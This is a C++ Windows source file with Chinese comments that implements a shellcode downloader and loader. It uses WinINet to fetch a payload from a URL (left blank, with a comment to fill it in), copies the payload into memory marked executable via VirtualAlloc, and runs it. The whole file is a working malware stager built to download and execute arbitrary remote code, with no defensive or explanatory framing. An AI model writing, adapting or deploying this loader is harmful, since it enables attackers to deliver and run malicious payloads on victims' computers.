#include <iostream>
#include <Windows.h>
#include <WinINet.h>
#include <vector>

#pragma comment(lib, "Wininet.lib")

bool DownloadShellcode(std::vector<unsigned char>& shellcode) {
    const char* url = "";  // 替换为Shellcode所在的URL

    HINTERNET hInternet = InternetOpenA("ShellcodeDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        std::cout << "无法初始化WinINet！" << std::endl;
        return false;
    }

    HINTERNET hConnection = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnection == NULL) {
        std::cout << "无法打开URL连接！" << std::endl;
        InternetCloseHandle(hInternet);
        return false;
    }

    DWORD bytesRead = 0;
    BYTE buffer[1024];
    while (InternetReadFile(hConnection, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
    }

    InternetCloseHandle(hConnection);
    InternetCloseHandle(hInternet);

    return true;
}

int main() {
    std::vector<unsigned char> shellcode;

    if (!DownloadShellcode(shellcode)) {
        std::cout << "无法下载Shellcode！" << std::endl;
        return 1;
    }

    // 分配内存空间
    void* exec_mem = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (exec_mem == nullptr) {
        std::cout << "无法分配内存空间！" << std::endl;
        return 1;
    }

    // 复制Shellcode到分配的内存空间
    memcpy(exec_mem, shellcode.data(), shellcode.size());

    // 执行Shellcode
    ((void(*)())exec_mem)();

    // 释放内存空间
    VirtualFree(exec_mem, 0, MEM_RELEASE);

    return 0;
}
